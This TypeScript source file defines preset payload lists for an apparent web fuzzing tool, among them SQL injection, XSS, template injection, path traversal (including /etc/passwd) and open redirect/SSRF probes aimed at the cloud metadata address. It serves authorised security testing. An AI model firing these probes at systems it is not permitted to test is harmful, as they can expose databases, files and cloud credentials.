export type IntruderPreset = {
  id: string;
  name: string;
  payloads: string[];
};

export const INTRUDER_PRESETS: IntruderPreset[] = [
  {
    id: "boolean",
    name: "Booleans and bits",
    payloads: ["true", "false", "1", "0", "yes", "no", "on", "off"],
  },
  {
    id: "numeric",
    name: "IDs 0–20",
    payloads: Array.from({ length: 21 }, (_, i) => String(i)),
  },
  {
    id: "sqli",
    name: "SQL injection probes",
    payloads: ["'", "''", "' OR 1=1--", "' OR '1'='1", "1 OR 1=1", "1; SELECT 1", "') OR ('1'='1", "\" OR \"\"=\"", "admin'--"],
  },
  {
    id: "xss",
    name: "XSS probes",
    payloads: ["<script>alert(1)</script>", "\"><img src=x onerror=alert(1)>", "{{constructor.constructor('alert(1)')()}}", "<svg/onload=alert(1)>"],
  },
  {
    id: "ssti",
    name: "SSTI probes",
    payloads: ["{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}", "{{config}}", "{{self}}"],
  },
  {
    id: "path",
    name: "Path traversal",
    payloads: ["../", "..%2f", "....//", "/etc/passwd", "..\\..\\windows\\win.ini"],
  },
  {
    id: "redirect",
    name: "Open redirect / SSRF",
    payloads: ["https://example.com", "//example.com", "/\\example.com", "http://127.0.0.1", "http://169.254.169.254/"],
  },
];

export function presetPayloads(id: string): string[] {
  return INTRUDER_PRESETS.find((item) => item.id === id)?.payloads ?? [];
}
